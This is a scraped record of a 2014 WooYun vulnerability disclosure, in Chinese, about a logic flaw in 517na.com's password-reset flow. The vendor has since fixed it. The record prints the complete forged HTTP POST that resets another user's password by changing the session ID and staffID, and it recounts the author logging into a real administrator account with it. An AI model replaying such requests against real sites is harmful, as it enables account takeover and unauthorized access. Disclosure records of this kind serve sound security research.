{"id": 86, "wybug_id": "wooyun-2014-082582", "wybug_title": "四川我要去哪517旅行网重置任意账号密码漏洞", "wybug_corp": "517na.com", "wybug_author": "Jim叔叔", "wybug_date": "2014-11-10 10:18", "wybug_open_date": "2014-11-11 21:40", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-11：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 呀，要毕业了，看到517na在校园招聘，去面试时，前台漂亮MM给我倒了一杯茶，面试官迟迟不来，于是... 详细说明：  我先注册了一个自己的账号，然后按照找回密码的正常流程走了一遍。猜测可能存在逻辑绕过：然后我从主站fuzz到一个账号为qingxia，点击找回密码，\n\n咦，打了马赛克！！右键查看源代码里发现有详细的手机号和邮箱。。（马赛克你是在逗我吗！）\n\n在找回密码处点击获取验证码后，随便输入一个6位数（此处无需短信验证码正确与否），点下一步。然后直接提交如下post包修改密码。（此数据包为我的账号用正常流程抓取到的第三步设置新密码的数据包）注意：需修改ASP.NET_SessionId为当前sessionid，staffID修改为要重置密码的用户名qingxia\nPOST /FindPassword/ChangePsw HTTP/1.1Host: user.517na.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://user.517na.com/FindPassword/ComfirmNewPwd?UserID=xjcjinmao&R=353730&D=2014-07-11%2022:05:23&Sign=C8690DB5B5240F7702755E8F8859622FContent-Length: 31Cookie: ASP.NET_SessionId=zvxqzk22ejubrmmk40hxr05eConnection: keep-alivePragma: no-cacheCache-Control: no-cachepassword=123123&staffID=qingxia\n\n\n返回OK！！！尝试用qingxia 123123登录，成功进入后台，发现是一个票务分销商的账号：\n\n查看源代码把我惊呆了，密码的md5清晰的写在了里面：\n\n还是一个管理员账号：\n\n就在此时，终于等到面试官叫我进去面试了，然后就没有然后了。。。   漏洞证明：  \n\n\n\n\n\n   修复方案：  听说贵公司安全是运维在做。。。   版权声明：转载请注明来源 Jim叔叔@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-11-10 10:49 厂商回复： 谢谢，已确认，正在修复。 最新状态： 2014-11-11：已修复。  ", "replys": "漏洞评价：\n评论\n     2014-11-09 14:56 |    \t\t夏殇 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:21        | 不忘初心，方得始终。)\t\t \n  哎呀，jim叔卖萌了    \n     2014-11-10 17:11 |    \t\tSeven.Sea \t\t\t( 实习白帽子  |\t\t\t        Rank:76 漏洞数:24        | 唯有安全与美食不可辜负。)\t\t \n  这个描述我真是醉了    \n     2014-11-12 11:16 |    \t\tPt0s \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 好奇怪，那人好像一条狗啊)\t\t \n  zui 醉了    \n     2014-11-12 12:25 |    \t\tBMa \t\t\t( 普通白帽子  |\t\t\t        Rank:1776 漏洞数:200        )\t\t \n  这应该是跳过了验证步骤？    \n     2014-11-13 15:04 |    \t\tmilk \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:5        | 美女，你肥皂掉了)\t\t \n  你继续看，会发现他们公司其他更好玩的事情    \n     2014-11-13 15:24 |    \t\tJim叔叔 \t\t\t( 普通白帽子  |\t\t\t        Rank:153 漏洞数:25        | 这样子不太好吧。。)\t\t \n  @milk 前端还是后端    \n     2014-11-14 13:03 |    \t\tkaysen \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | 折腾Python、Php、Linux)\t\t \n  你那在线解密只解密白C似的密码，复杂一点的解不出，实际上是拿字典生成了原始密码=>MD5密码，存入数据库的    \n     2014-11-27 13:43 |    \t\tweeeer \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:1        | 在路上.........)\t\t \n  默默连上wifi    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}